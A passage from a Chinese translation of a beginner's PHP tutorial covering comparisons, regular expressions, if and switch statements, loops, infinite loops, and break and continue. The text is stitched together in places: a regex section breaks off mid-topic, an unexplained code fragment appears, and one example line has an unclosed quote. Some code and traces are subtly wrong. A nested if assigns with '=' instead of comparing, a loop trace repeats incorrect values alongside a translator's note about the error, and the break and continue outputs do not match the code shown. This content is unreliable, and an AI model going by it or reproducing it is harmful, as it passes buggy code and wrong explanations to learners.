  \n如果你写一个否定（通过使用 `!`），则否定条件为真。看下面的比较：\n\n```php\n$age != 21\n```\n\n正在测试的条件是 `$age`\
  \ 不等于 `21`。因此，如果 `$age` 等于 `20`，则比较为真。\n\n## 检查变量内容\n\n有时你只需要知道变量是否存在或变量中包含什么类型的数据。这里是一些测试变量常用方法：\n\
  \n```php\nisset($varname) # 如果变量已设置，即使其中没有存储也为真。\nempty($varname) # 如果值为 0 或是空字符串或未设置，则为真。\n\
  ```\n\n你还可以测试变量中包含什么类型的数据。例如，要查看值是否为整数，你可以使用以下代码：\n\n```php\nis_int($number)\n```\n\
  \n如果 `$number` 中的值为整数，则比较为真。PHP 提供的其他测试如下：\n\n![check](img/check.png) `is_array($var2)`:\
  \ 检查 `$var2` 是否为数组。\n\n![check](img/check.png) `is_float($number)`: 检查 `$number`\
  \ 是否为浮点数。\n\n![check](img/check.png) `is_null($var1)`: 检查 `$var1` 是否为空。\n\n![check](img/check.png)\
  \ `is_numeric($string)`: 检查 `$string` 是否为数字。\n\n![check](img/check.png) `is_string($string)`:\
  \ 检查 `$string` 是否为字符串。\n\n如果你写一个否定（通过使用 `!`），则否定条件为真。看下面的比较：\n\n```php\n!isset($varname)\n\
  ```\n\n你可以用通语言将其理解为“如果 `$varname` 不存在”。\n\n## 使用正则表达式进行模式匹配\n\n有时你需要比较字符串以查看它们是否符合某些特征，而不是查看它们是否匹配精确值。例如，你可能想识别以\
  \ S 开头或包含数字的字符串。你过去可能使用过某种形式的模式匹配。当你使用星号 (`*`) 作为通配符时（例如 `dir*.doc`），你正在进行模式匹配。例如，`ex*.txt`\
  \ 是一个模式。任何以 `ex` 开头并以 `.txt` 结尾且带有任何字符的字符串都匹配该模式。这些模式被称为正则表达式。\n\n模式匹配的一个常见用途是检查来自网页的输入。如果输入的信息不匹配特定模式，它可能不是你想存储在数据库中的内容。例如，如果用户在表单中输入邮编，你知道格式需要五个数字或邮编+4。因此，你可以检查输入以查看其是否符合模式。如果不符合，你就知道这不是有效的邮编，你可以要求用户输入正确的信息。\n\
  \n正则表达式用于许多情况下的模式匹配。许多 Linux 命令和程序（如 `grep`, `vi` 或 `sed`）使用正则表达式。许多应用程序（如文本编辑器和文字处理器）允许使用正则表达式搜索。\n\
  \nPHP 支持 Perl 兼容正则表达式。以下章节描述了一些基础 Perl 兼容正则表达式，但可以进行更复杂、更强大的模式匹配。请参阅 [`www.php.net/manual/en/reference.pcre.pattern.syntax.php`](http://www.php.net/manual/en/reference.pcre.pattern.syntax.php）进一步解释正则表达式。\n\
  \n## 在模式中使用特殊字符\n\n模式由字面字符和特殊字符组成。\n\n![check](img/check.png) 字面字符是普通字符，没有特殊含义。例如，`e`\
  \ 就是 `e`，除了它是字母表中的 26 个字母之一之外没有其他含义。\n\n![check](img/check.png) 反之，特殊字符在模式中具有特殊含义，例如作为通配符使用的星号\
  \ (`*`）。表 2-2 显示了可以在模式中使用的特殊字符。\n\n![表 2-2](img/9781118213704-tb040202.png)\n\n\
  ### 考虑一些示例模式\n\n\n\n\n字面字符和特殊字符组合成模式，有时是很长且复杂的模式。将一个字符串与模式进行比较，如果匹配，则比较结果为真。以下是一些示例模式，并包含了对模式的拆解以及一些匹配和不匹配的字符串示例。\n\
  \n## 示例 1\n\n`^[A-Za-z].*`\n\n该模式定义了以字母开头并包含以下两个部分的字符串：\n\n- ![check](img/check.png)\
  \ `^[A-Za-z]`: 模式的第一部分规定字符串的开头必须是一个字母（大写或小写）。\n- ![check](img/check.png) `.*`: 模式的第二部分告诉\
  \ PHP 字符字符串的长度可以是一个或多个字符，包括数字、空格或任何内容。\n\n表达式 `^[A-Za-z].*` 匹配以下字符串：`play it again,\
  \ Sam, 4 times` 和 `I`。\n\n表达式 `^[A-Za-z].*` 不匹配以下字符串：`123` 和 `?`。\n\n## 示例 2\n\n\
  `Dear (Kim|Rikki)`\n\n该模式定义了两个备选字符串，并包含以下两个部分：\n\n- ![check](img/check.png) `Dear`:\
  \ 模式的第一部分只是字面字符，后跟一个空格。\n- ![check](img/check.png) `(Kim|Rikki)`: 模式的第二部分定义了 `Kim`\
  \ 或 `Rikki` 为匹配字符串。\n\n表达式 `Dear (Kim|Rikki)` 匹配以下字符串：`Dear Kim` 和 `My Dear Rikki`。\n\
  \n表达式 `Dear (Kim|Rikki)` 不匹配以下字符串：`Dear Bobby` 和 `Kim`。\n\n## 示例 3\n\n`^[0-9]{5}(\\\
  -[0-9]{4})?$`\n\n该模式定义了任何邮政编码编码，并包含多个部分：\n\n- ![check](img/check.png) `^[0-9]{5}`:\
  \ 模式的第一部分描述任意五个数字字符串。\n- ![check](img/check.png) `\\-`: 反斜杠表示连字符是字面量。\n- ![check](img/check.png)\
  \ `[0-9]{4}`: 模式的这部分告诉 PHP 接下来的字符应该是由四个字符组成的数字字符串。\n- ![check](img/check.png) `(\
  \ )?`: 这些字符将模式的最后两个部分分组并使其成为可选。\n- ![check](img/check.png) `$`: 美元符号规定该字符串应该结束（模式后不允许有任何字符）。\n\
  \n表达式 `^[0-9]{5}(\\-[0-9]{4})?$` 匹配以下字符串：`90001` 和 `90002-4323`。\n\n表达式 `^[0-9]{5}(\\\
  -[0-9]{4})?$` 不匹配以下字符串：`9001` 和 `12-4321`。\n\n## 示例 4\n\n`^.+@.+\\.com$`\n\n该模式定义了嵌入\
  \ `@` 并以 `.com` 结尾的任意字符串。句话说，它定义了电子邮件地址的一种常见（并非唯一）格式。该表达式包含几个部分：\n\n- ![check](img/check.png)\
  \ `^.+`: 模式的第一部分描述 `@` 之前的任意一个或多个字符的字符串。\n- ![check](img/check.png) `@`: 这是字面量 `@`（“at”符号）。`@`\
  \ 不是特殊字符，不需要在它前面加 `\\`。\n- ![check](img/check.png) `.+`: 这是任意一个或多个字符的字符串。\n- ![check](img/check.png)\
  \ `\\.`: 斜杠表示 PHP 应该寻找字面点。\n- ![check](img/check.png) `com$`: 这定义了字符串结尾的字面字符串 `com`，`$`\
  \ 标记字符串的结束。\n\n表达式 `^.+@.+\\.com$` 匹配以下字符串：`you@yourcompany.com` 和 `johndoe@somedomain.com`。\n\
  \n表达式 `^.+@.+\\.com$` 不匹配以下字符串：`you@yourcompany.net`、`you@.com` 和 `@you.com`。\n\n\
  ## 使用 PHP 函数进行模式匹配\n\n你可以使用 `preg_match` 函数来比较模式是否匹配字符串。通用格式如下：\n\n```\npreg_match(\"\
  /pattern\", \"value\");\n```\n\n模式必须封装一对分隔符中。通常使用正斜杠（`/`）作为分隔符。然而，你可以使用任何非字母数字字符，反斜杠（`\\\
  `）除外。例如，为了检查用户在表单中输入的名称，如下所示与存储在变量 `$name` 中的名称进行匹配：\n\n```\npreg_match(\"/^[A-Za-z'\
  \ -]+$/\", $name);\n```\n\n该语句中的模式执行以下操作：\n\n- ![check](img/check.png) 使用正斜杠（`/`）封装模式。\n\
  - ![check](img/check.png) 使用 `^` 和 `$` 分别表示字符串的开头结束。这意味着字符串中的所有字符必须匹配模式。\n- ![check](img/check.png)\
  \ 使用 `[` `]` 将字符串中允许的所有字面字符封装在内。不允许任何其他字符。允许的字符是大写和小写字母、单引号（`'``）、空白格和连字符（`-`）。\n\
  \n你可以通过在连字符内部使用连字符来指定字符范围。\n\n\n\n\n你可以使用括号来改变比较的顺序。括号内部的连接词会被先计算。例如，你可以用括号重写前面的语句：\n\
  \n```\n($resCity == \"Reno or $resState == \"NV\") and $name == \"Sally\"\n```\n\
  \n括号改变了检查检查的顺序。现在 `or` 先被检查，因为它在括号内部。如果客户的名字是 Sally 且她住在 Reno 或 NV 某地，则该条件语句为真。你得到这些结果，是因为脚本按如下方式检查条件：\n\
  \n1. 比较 `or`。\n\n脚本检查 `$resCity` 是否等于 `Reno` 或 `$resState` 是否等于 `NV`。如果不是，则整个条件为假，测试停止。如果是，则该条件的这部分为真。然而，`and`\
  \ 另一侧的比较也必须为真，因此测试继续。\n\n2. 比较 `and`。\n\n脚本检查 `$name` 查看是否等于 `Sally`。如果是，则条件为真。如果不是，则条件为假。\n\
  \n![tip.eps](img/tip_fmt.png) 尽可能多使用括号，即使你认为自己已经知道比较的顺序。不必要的括号无害，但产生意想不到结果的比较会有害。\n\
  \n![technicalstuff.eps](img/technicalstuff_fmt.png) 如果你熟悉其他语言（如 C），可能使用了 `||`（代表\
  \ `or`）和 `&&`（代表 `and`）来代替单词。`||` 和 `&&` 在 PHP 中同样有效。语句 `$a < $b && $c > $b` 与 `$a\
  \ < $b and $c > $b` 同样有效。`||` 在 `or` 之前检查，`&&` 在 `and` 之前检查。\n\n# 使用条件语句\n\n条件语句仅在特定条件为真时执行语句块。这里有两种实用的条件语句：\n\
  \n![check](img/check.png) `if` 语句：设置一个条件并对其进行测试。如果条件为真，则执行语句块。\n\n![check](img/check.png)\
  \ `switch` 语句：设置一组备选条件。它测试真条件并执行相应的语句块。\n\n我们将在下文中告诉你如何使用这两种条件语句。\n\n## 使用 if 语句\n\
  \n`if` 语句测试条件，当条件为真时执行语句块。后续章节将讨论如何使用适当的格式构建 `if` 语句、为假条件创建 `if` 语句，并将一个 `if` 语句嵌套另一个内部。\n\
  \n### 构建 if 语句\n\n`if` 条件语句的通用格式如下：\n\n```\nif (condition)\n{\n  block of statements\n\
  }\nelseif (condition)\n{\n  block of statements\n}\nelse\n{\n  block of statements\n\
  }\n```\n\n`if` 语句由三部分组成：\n\n![check](img/check.png) `if`：这部分是必须。只允许一个 `if`。它测试一个条件：\n\
  \n- 如果条件为真：执行语句块。执行语句后，脚本移动到条件语句后的下一个指令；如果条件语句包含任何 `elseif` 或 `else` 部分，脚本将跳过它们。\n\
  - 如果条件不为真：不执行语句块。脚本跳到下一个指令，该指令可以是 `elseif`、`else` 或 `if` 条件语句后的下一个指令。\n\n![check](img/check.png)\
  \ `elseif`：这部分是可选的。如果你需要，可以使用多个 `elseif`。`elseif` 也测试一个条件：\n\n- 如果条件为真：执行语句块。执行语句块后，脚本转到条件语句后的下一个指令；如果\
  \ `if` 语句包含任何额外的 `elseif` 部分或 `else` 部分，脚本将跳过它们。\n- 如果条件不为真：不执行语句块。脚本跳到下一个指令，该指令可以是\
  \ `elseif`、`else` 或 `if` 条件语句后的下一个指令。\n\n![check](img/check.png) `else`：这部分也是可选的。只允许一个\
  \ `else`。这部分不测试条件，而是执行语句块。只有当 `if` 部分和所有 `elseif` 部分都不为真时，脚本才会进入 `else` 部分。\n\n\
  这是一个如何构建 `if` 语句的示例。假设你是一个老师。以下 `if` 语句在接收到测试分数时，会向学生发送一个等级和简短的短信。它使用了 `if` 语句的所有三个部分（`if`、`elseif`\
  \ 和 `else`），如下：\n\n```\nif ($score > 92 )\n{\n  $grade = \"A\";\n  $message = \"\
  Excellent!\";\n}\nelseif ($score <= 92 and $score > 83 )\n{\n  $grade = \"B\";\n\
  \  $message = \"Good!\";\n}\nelseif ($score <= 83 and $score > 74 )\n{\n  $grade\
  \ = \"C\";\n  $message = \"Okay\";\n}\nelseif ($score <= 74 and $score > 62 )\n\
  {\n  $grade = \"D\";\n  $message = \"Uh oh!\";\n}\nelse\n{\n  $grade = \"F\";\n\
  \  $message = \"Doom is you!\";\n}\n```\n\n该 `if` 语句在给定分数时的执行如下：\n\n1. 比较 `$score\
  \ > 92`。如果为真，将 `$grade` 赋值为 \"A\"，并将 `$message` 赋值为 \"Excellent!\"。执行完语句后，由于该条件语句包含任何\
  \ `elseif` 或 `else` 部分，脚本将跳过它们。\n\n2. 比较 `$score <= 92 and $score > 83`。如果为真，将 `$grade`\
  \ 赋值为 \"B\"，并将 `$message` 赋值为 \"Good!\"。执行完语句后，由于该条件语句包含任何 `elseif` 或 `else` 部分，脚本将跳过它们。\n\
  \n3. 比较 `$score <= 83 and $score > 74`。如果为真，将 `$grade` 赋值为 \"C\"，并将 `$message` 赋值为\
  \ \"Okay\"。执行完语句后，由于该条件语句包含任何 `elseif` 或 `else` 部分，脚本将跳过它们。\n\n4. 比较 `$score <=\
  \ 74 and $score > 62`。如果为真，将 `$grade` 赋值为 \"D\"，并将 `$message` 赋值为 \"Uh oh!\"。执行完语句后，由于该条件语句包含\
  \ `else` 部分，脚本将跳过它们。\n\n5. 执行 `else`。将 `$grade` 赋值为 \"F\"，并将 `$message` 赋值为 \"Doom\
  \ is you!\"。脚本继续：\n\n```\necho $message.\"n\";\necho \"Your grade is $grade\\n\"\
  ;\n```\n\n\n\n\n```php\n{\n    $list[]=$string.\"\\n\";\n}\n```\n\n在这种情况下，数组 `$list`\
  \ 包含了所有不以 `S` 开头的字符串。因为 `!` 出现在条件的开头，该条件的意思是“`string` 不匹配以 `S` 开头的模式”。因此，当 `$string`\
  \ 不以 `S` 开头时，条件为 `true`。\n\n## 嵌套 if 语句\n\n你可以在一个 `if` 条件语句内部包含另一个 `if` 条件语句。将一个语句放在另一个语句内部被称为嵌套。例如，假设你需要联系所有居住在爱达荷州（Idaho）的客户。你计划向有电子邮件地址的人发送电子邮件，向没有电子邮件地址的人发送信件。你可以使用以下嵌套\
  \ `if` 语句来识别客户群体：\n\n```php\nif ( $custState == \"ID\" )\n{\n    if ( $EmailAdd\
  \ = \"\" )\n    {\n      $contactMethod = \"letter\";\n    }\n    else\n    {\n\
  \      $contactMethod = \"email\";\n    }\n}\nelse\n{\n    $contactMethod = \"none\
  \ needed\";\n}\n```\n\n这些语句首先检查客户是否居住在爱达荷州。如果客户确实住在爱达荷州，脚本会测试电子邮件地址。如果电子邮件地址为空，则联系方式被设置为\
  \ `letter`。如果电子邮件地址不为空，则联系方式为 `email`。如果客户不在爱达荷州，`else` 部分将设置联系方式，表示完全不会联系该客户。\n\
  \n## 使用 switch 语句\n\n对于大多数情况，`if` 条件语句的效果最好。然而，有时你有一组条件，并希望为每个条件执行不同的语句。例如，假设你的脚本正在计算销售税。你该如何处理不同州的销售税率？`switch`\
  \ 语句就是为这种情况设计的。\n\n`switch` 语句测试一个变量的值，并根据该变量匹配的值执行语句块。其通用格式如下：\n\n```php\nswitch\
  \ ( $variablename )\n{\n    case value :\n      block of statements;\n      break;\n\
  \    case value :\n      block of statements;\n      break;\n    ...\n    default:\n\
  \      block of statements;\n      break;\n}\n```\n\n`switch` 语句测试 `$variablename`\
  \ 的值。脚本随后跳转到该值的 `case` 部分并执行语句，直到遇到 `break` 语句或 `switch` 语句的结束。如果 `$variablename`\
  \ 的值没有对应的 `case` 部分，脚本将执行 `default` 部分。你可以根据需要使用尽可能多个 `case` 部分。`default` 部分是可选的。如果你使用了\
  \ `default` 部分，习惯做法是将其放在最后，但从 PHP 的角度来看，它可以放在任何地方。\n\n以下语句设置了不同州的销售税率：\n\n```php\n\
  switch ( $custState )\n{\n    case \"OR\" :\n      $salestaxrate = 0;\n      break;\n\
  \    case \"CA\" :\n      $salestaxrate = 1.0;\n      break;\n  default:\n     \
  \ $salestaxrate = .5;\n      break;\n}\n\n$salestax = $orderTotalCost * $salestaxrate;\n\
  ```\n\n在这种情况下，俄勒冈州的税率为 0，加利福尼亚州的税率为 100%，而所有其他州的税率为 50%。`switch` 语句查看 `$custState`\
  \ 的值，并跳转到匹配该值的部分。例如，如果 `$custState` 是 `TX`，脚本将执行 `default` 部分并将 `$salestaxrate`\
  \ 设置为 `.5`。在 `switch` 语句之后，脚本按订单成本的 .5 倍计算 `$salestax`。\n\n`break` 语句对于结束 `case`\
  \ 部分至关重要。如果一个 `case` 部分没有包含 `break` 语句，脚本在 `case` 部分结束时不会停止执行语句。脚本将继续执行 `case` 部分之后的语句，进入下一个\
  \ `case` 部分，直到遇到 `break` 语句或 `switch` 语句结束。对于除最后一个之外每一个 `case` 部分来说这是一个问题，因为它会执行匹配部分之后的部分。\n\
  \n![tip.eps](img/tip_fmt.png) 在某些少数情况下，你可能希望当 `switch` 变量匹配第一个 `case` 部分的值时执行两个\
  \ `case` 部分，你可以省略第一个 `case` 部分中的 `break` 语句。这并不是常见的情况，但偶尔可以解决问题。\n\n![remember.eps](img/remember_fmt.png)\
  \ `switch` 语句中的最后一个 `case` 部分实际上并不需要 `break` 语句。你可以省略它。然而，为了清晰和一致性，包含它是一个好主意。\n\n\
  ## 使用循环重复操作\n\n脚本中经常使用循环来设置一组重复的语句块。循环可以重复指定的次数。例如，输出美国所有州首的循环需要重复 50 次。或者，循环可以一直重复直到满足某个条件为止。例如，输出目录中所有文件名的循环需要重复到文件用完为止，无论其中有多少个文件。\n\
  \n这里是三种类型的循环：\n\n![check](img/check.png) `for` 循环：设置一个计数器；重复语句块，直到计数器达到指定的数字。\n\n\
  ![check](img/check.png) `while` 循环：设置一个条件；检查该条件，如果为真，则重复语句块，直到条件变为假。\n\n![check](img/check.png)\
  \ `do..while` 循环：设置一个条件；执行语句块；检查该条件，如果为真，则重复语句，直到条件变为假。\n\n我们将详细描述这些循环中的每一个。\n\n\
  ### 使用 for 循环\n\n最基础的 `for` 循环基于计数器。你设置计数器的起始值、结束值以及计数器的增值。我们将教你如何构建该循环，然后如何将一个嵌套在另一个内部并构建更复杂的循环。\n\
  \n### 构建 for 循环\n\n`for` 循环的通用格式如下：\n\n```php\nfor (startingvalue;endingcondition;increment)\n\
  {\n    block of statements;\n}\n```\n\n在 `for` 语句中，你需要填充以下值：\n\n![check](img/check.png)\
  \ `startingvalue`：`startingvalue` 是一个语句，用于初始化变量作为你的计数器并将其设置为起始值。例如，语句 `$i=1;` 将\
  \ `$i` 设置为计数器并将其设置为 1。通常，计数器变量从 0 或 1 开始。起始值可以是一个数字、数字组合（如 `2 + 2`）或变量。\n\n![check](img/check.png)\
  \ `endingcondition`：`endingcondition` 是一个设置结束值的语句。只要该语句为真，语句块就会持续重复。当该语句为假时，循环结束。例如，语句\
  \ `$i<10;` 将循环的结束值设置为 10。当 `$i` 等于 10 时，该语句不再为真（因为 `$i` 不再小于 10），循环停止重复。语句可以包含变量，例如\
  \ `$i<$size;`。\n\n![check](img/check.png) `increment`：该语句增加你的计数器的值。例如，语句 `$i++;`\
  \ 在每个语句块结束时给你的计数器加 1。你可以使用其他增值语句，例如 `$i=+1;` 或 `$i--;`。\n\n基础的 `for` 循环设置了一个类似 `$i`\
  \ 的变量作为计数器。该变量的值在每次循环中都会变化。变量 `$i` 可以用在重复的语句块中。例如，以下简单循环将显示三次 `Hello World!`：\n\n\
  ```php\nfor ($i=1;$i<=3;$i++)\n{\n    echo \"$i. Hello World!<br />\";\n}\n```\n\
  \n以下是这些语句的输出：\n\n`1\\. Hello World!`\n\n`2\\. Hello World!`\n\n`3\\. Hello World!`\n\
  \n\n\n\n\n你可以在 `for` 循环内部嵌套另一个 `for` 循环。假设你想打印从 1 到 9 的乘法表。你可以使用以下语句：\n\n```php\n\
  for($i=1;$i<=9;$i++)\n{\n    echo \"\\nMultiply by $i \\n\";\n    for($j=1;$j<=9;$j++)\n\
  \    {\n        $result = $i * $j;\n        echo \"$i x $j = $result\\n\";\n   \
  \ }\n}\n```\n\n输出如下：\n\n```\nMultiply by 1\n1 x 1 = 1\n1 x 2 = 2\n...\n1 x 8 = 8\n\
  1 x 9 = 9\nMultiply by 2\n2 x 1 = 2\n2 x 2 = 4\n...\n2 x 8 = 16\n2 x 9 = 18\nMultiply\
  \ by 3\n3 x 1 = 3\n依此类推。\n```\n\n## 设计高级的 for 循环\n\n`for` 循环的结构非常灵活，允许你为几乎任何目的构建循环。虽然本节在此之前讨论的基础\
  \ `for` 循环在起始、条件和递增部分各有一条语句，但通用格式允许每个部分包含多条语句。通用格式为：\n\n```php\nfor (beginning statements;\
  \ conditional statements; ending statements)\n{\n    block of statements;\n}\n```\n\
  \n`for` 循环内部的语句具有以下作用：\n\n- ![check](img/check.png) `beginning statements`（起始语句）在循环开始时执行一次。它们可以是设置任何需要的初始值的语句，或者是在循环开始运行之前想要执行的其他语句。\n\
  - ![check](img/check.png) `conditional statements`（条件语句）在循环的每次迭代中都会进行测试。\n- ![check](img/check.png)\
  \ `ending statements`（结束语句）在循环结束时执行一次。它们可以是增加变量值的语句，或者任何你想要在循环结束时执行的其他语句。\n\n每个语句部分之间用分号（`;`）分隔。每个部分可以包含任意数量的语句，并用逗号分隔。任何部分都可以是空的。\n\
  \n以下循环在三个部分都包含语句：\n\n```php\n$t = 0;\nfor ($i=0,$j=1;$t<=4;$i++,$j++)\n{\n  $t =\
  \ $i + $j;\n  echo \"$t<br />\";\n}\n```\n\n在这个示例中，`$i=0` 和 `$j=1` 是起始语句， `$t<=4`\
  \ 是条件语句，而 `$i++` 和 `$j++` 是结束语句。\n\n这些语句的输出如下：\n\n```\n1\n3\n5\n```\n\n循环的执行顺序如下：\n\
  \n1. 执行包含两个语句的起始部分。`$i` 被设置为 `0`，`$j` 被设置为 `1`。\n2. 评估包含一条语句的条件部分。`$t` 是否小于或等于 `4`？是的，所以该语句为真。循环继续执行。\n\
  3. 执行语句块中的语句。`$t` 等于 `$i` 加上 `$j`，即 `0 + 1`，等于 `1`。然后输出 `$t` 的结果 `1`。\n4. 执行包含两个语句的结束部分（`$i++`\
  \ 和 `$j++`）。`$i` 和 `$j` 均加 1，所以 `$i` 现在等于 `1`，`$j` 现在等于 `2`。\n5. 评估条件部分。`$t` 是否小于或等于\
  \ `4`？因为此时 `$t` 等于 `1`，所以该语句为真。循环继续执行。\n6. 执行语句块中的语句。`$t` 等于 `$i` 加上 `$j`，即 `1 +\
  \ 2`，等于 `3`。然后输出 `$t` 的结果 `3`。\n7. 执行包含两个语句的结束部分（`$i++` 和 `$j++`）。`$i` 和 `$j` 均加\
  \ 1，所以 `$i` 现在等于 `2`，`$j` 现在等于 `3`。\n8. 评估条件部分。`$t` 是否小于或等于 `4`？因为现在 `$t` 等于 `3`，所以该语句为真。循环继续执行。\n\
  9. 执行语句块中的语句。`$t` 等于 `$i` 加上 `$j`，即 `2 + 3`，等于 `5`。然后输出 `$t` 的结果 `5`。\n10. 执行包含两个语句的结束部分（`$i++`\
  \ 和 `$j++`）。`$i` 和 `$j` 均加 1，所以 `$i` 现在等于 `2`，`$j` 现在等于 `3`。（注：原文此处逻辑有拼写错误，但保留了内容）。\n\
  11. 评估条件部分。`$t` 是否小于或等于 `4`？因为现在 `$t` 等于 `5`，所以该语句为假。循环终止。\n\n## 使用 while 循环\n\n\
  `while` 循环只要条件为真就会一直执行：\n\n```php\nwhile (condition)\n{\n    block of statements;\n\
  }\n```\n\n`while` 循环的工作原理如下：\n\n1. 评估条件。如果为真，则执行 `block of statements`。\n2. 执行语句块后，流程回到\
  \ `while` 循环的开头。\n3. 如果条件为真，再次执行 `block of statements`。\n4. 如果条件为假，循环终止。\n\n以下示例：\n\
  \n```php\n$x = 0;\nwhile ($x < 3)\n{\n    echo \"$x \";\n    $x++;\n}\n```\n\n在这个示例中，`$x`\
  \ 初始化为 `0`。条件 `$x < 3` 为真，因此输出 `0` 并将 `$x` 增 1。此过程一直持续直到 `$x` 变为 `3`，此时条件为假，循环结束。\n\
  \n## 使用 do..while 循环\n\n`do..while` 循环与 `while` 循环类似，但在检查条件之前会至少执行一次语句块：\n\n```php\n\
  do\n{\n    block of statements;\n} while (condition);\n```\n\n`do..while` 循环的工作原理如下：\n\
  \n1. 执行一次 `block of statements`。\n2. 评估条件。\n3. 如果条件为真，再次执行 `block of statements`。\n\
  4. 如果条件为假，循环终止。\n\n以下示例：\n\n```php\n$x = 0;\ndo\n{\n    echo \"$x \";\n    $x++;\n\
  } while ($x < 3);\n```\n\n在这个示例中，`$x` 初始化为 `0`。执行语句块，输出 `0` 并将 `$x` 增 1。条件 `$x <\
  \ 3` 为真，循环再次运行。持续运行直到 `$x` 变为 `3`，此时条件为假，循环终止。\n\n\n\n\n\n```php\n$fruit = array\
  \ ( \"orange\", \"apple\", \"grape\" );\n$testvar = \"no\";\n$k = 0;\ndo\n{\n  if\
  \ ($fruit[$k] == \"apple\" )\n  {\n    $testvar = \"yes\";\n    echo \"apple\\n\"\
  ;\n  }\n  else\n  {\n    echo \"$fruit[$k] is not an apple\\n\";\n  }\n  $k++;\n\
  } while ( $testvar != \"yes\" );\n```\n\n在浏览器中，这些语句的输出如下：\n\n`orange is not an apple`\n\
  `apple`\n\n这与 `while` 循环示例的输出相同。`while` 循环和 `do..while` 循环的区别在于条件检查的位置。在 `while`\
  \ 循环中，条件在循环顶部检查。因此，如果条件永远不为真，循环将永远不会执行。而在 `do..while` 循环中，条件在循环底部检查。因此，即使条件永远不为真，循环也至少会执行一次。\n\
  \n例如，在前面的检查苹果的循环中，假设通过以下语句将初始条件设置为 `yes` 而不是 `no`：\n\n`$testvar = \"yes\";`\n\n\
  条件从一开始就为假，永远不会为真。在 `while` 循环中，没有输出，语句块永远不会运行。然而，在 `do..while` 循环中，语句块会在条件检查之前运行一次。因此，`while`\
  \ 循环没有输出，而 `do..while` 循环产生以下输出：\n\n`orange is not an apple`\n\n`do..while` 循环在条件检查之前产生一行输出。由于条件为假，它不会产生第二行输出。\n\
  \n## 避免无限循环\n\n你很容易设置出永远不会停止的循环，这些被称为无限循环。它们会永远重复。然而，很少有人会故意创建无限循环，这通常是编程中的错误。例如，对设置\
  \ `while` 循环的脚本稍作修改，就可能使其变成无限循环。\n\n以下是本章前面使用 while 循环一节中展示的脚本，稍作修改后的版本：\n\n```php\n\
  $fruit = array ( \"orange\", \"apple\", \"grape\" );\n$testvar = \"no\";\nwhile\
  \ ( $testvar != \"yes\" )\n{\n  $k = 0;\n  if ($fruit[$k] == \"apple\" )\n  {\n\
  \    $testvar = \"yes\";\n    echo \"apple\\n\";\n  }\n  else\n  {\n    echo \"\
  $fruit[$k] is not an apple\\n\";\n  }\n  $k++;\n}\n```\n\n这个小小的改动是将语句 `$k = 0;`\
  \ 从循环外部移到了循环内部。这个微小的变化使其变成了一个无限循环。修改后的脚本输出如下：\n\n`orange is not an apple`\n`orange\
  \ is not an apple`\n`orange is not an apple`\n`orange is not an apple`\n`...`\n\n\
  这将永远重复。每次循环运行时，它都会将 `$k` 重置为 `0`。然后获取 `$fruit[0]` 并输出。在循环结束时，`$k` 递增为 `1`。然而，当循环再次开始时，`$k`\
  \ 又被重置为 `0`。因此，数组中只有第一个值 `orange` 被读取。循环永远无法到达 `apple`，`$testvar` 也永远不会被设置为 `\"\
  yes\"`。循环是无限的。\n\n如果你写了一个无限循环，不必感到尴尬。我们保证世界上最好的编程大师也写过无数个无限循环。这没什么大不了的。如果你在测试脚本时发现输出无限重复，无需惊慌。请执行以下操作之一：\n\
  \n![check](img/check.png) 如果你在网页上使用 PHP：等待。它会在短时间内自行停止。默认时间为 30 秒，但 PHP 管理员可能已经更改了超时时间。你也可以点击浏览器的“停止”按钮来停止浏览器中的显示。\n\
  \n![check](img/check.png) 如果你使用 PHP CLI：按下 `Ctrl+C`（Mac 上为 `Cmd+C`）。这将停止脚本运行。有时输出会继续显示一小段时间，但很快就会停止。\n\
  \n然后找出循环无限重复的原因并修复它。\n\n![tip.eps](img/tip_fmt.png) 一个常见的导致无限循环的错误是，本意是使用双等号（`==`）时却使用了单等号（`=`）。单等号将值存储到变量中；双等号测试两个值是否相等。以下使用单等号的条件始终为真：\n\
  \n`while ($testvar = \"yes\")`\n\n该条件只是将 `$testvar` 设置为 `\"yes\"`。这不是一个可能为假的问题。你本意可能是这样写：\n\
  \n`while ($testvar == \"yes\")`\n\n这是一个询问 `$testvar` 是否等于 `\"yes\"` 的问题，答案可以是真或假。\n\
  \n另一个常见错误是遗漏了递增计数器的语句。例如，在本节前面的脚本中，如果遗漏了语句 `$k++;`，`$k` 将始终为 `0`，结果就是无限循环。\n\n##\
  \ 跳出循环\n\n有时你希望脚本跳出循环。PHP 提供了两个用于此目的的语句：\n\n![check](img/check.png) `break`：完全跳出循环，并继续执行循环之后的脚本语句。\n\
  \n![check](img/check.png) `continue`：跳转到循环的末尾，在那里检查条件。如果条件为真，脚本从循环顶部继续执行。\n\n`break`\
  \ 和 `continue` 语句通常用于条件语句中。特别是，`break` 最常用于 `switch` 语句中，本章前面已经讨论过。\n\n以下语句展示了 `break`\
  \ 语句的示例：\n\n```php\n$counter = 0;\nwhile ($counter < 5 )\n{\n  $counter++;\n  if\
  \ ($counter == 3 )\n  {\n    echo \"break\\n\";\n    break;\n  }\n  echo \"Last\
  \ line in loop: $counter\\n\";\n}\n```\n\n该语句的输出如下：\n\n`Last line in loop: counter=1`\n\
  `Last line in loop: counter=2`\n\n`break`\n`First after loop`\n\n注意，第一个循环在 `break`\
  \ 语句处结束。它停止循环并立即跳转到循环之后的语句。而 `continue` 语句则不同。以下代码给出了 `continue` 语句的示例：\n\n```php\n\
  $counter = 0;\nwhile ($counter < 5 )\n{\n  $counter++;\n  if ($counter == 3 )\n\
  \  {\n    echo \"continue\\n\";\n    continue;\n  }\n  echo \"Last line in loop:\
  \ $counter\\n\";\n}\n```\n\n该语句的输出如下：\n\n`Last line in loop: counter=1`\n`Last line\
  \ in loop: counter=2`\n`continue`\n`Last line in loop: counter=4`\n`Last line in\
  \ loop: counter=5`\n\n`First after loop`\n\n与 `break` 语句循环不同，这个循环不会在 `continue`\
  \ 语句处结束。它只是停止了第三次循环重复，并跳回循环顶部。然后它完成循环，进行第四次和第五次重复，之后才进入循环之后的语句。\n\n`break` 语句的一个用途是作为防止无限循环的保险。循环内的以下语句可以在合理的位置停止它：\n\
  \n```php\n$test4infinity++;\nif ($test4infinity > 100 )\n{\n  break;\n}\n```\n\n\
  ![tip.eps](img/tip_fmt.png) 如果你确信循环重复次数不应超过 100 次，可以使用这些语句在循环变成无限时停止它。根据你构建的循环，使用任何你认为合理的数字。\n\
  \n# 使用函数\n\n应用程序经常在脚本的不同位置或不同脚本中执行相同的任务。函数的设计目的是让你能够在不同位置重用相同的代码。函数是一组执行特定任务的 PHP\
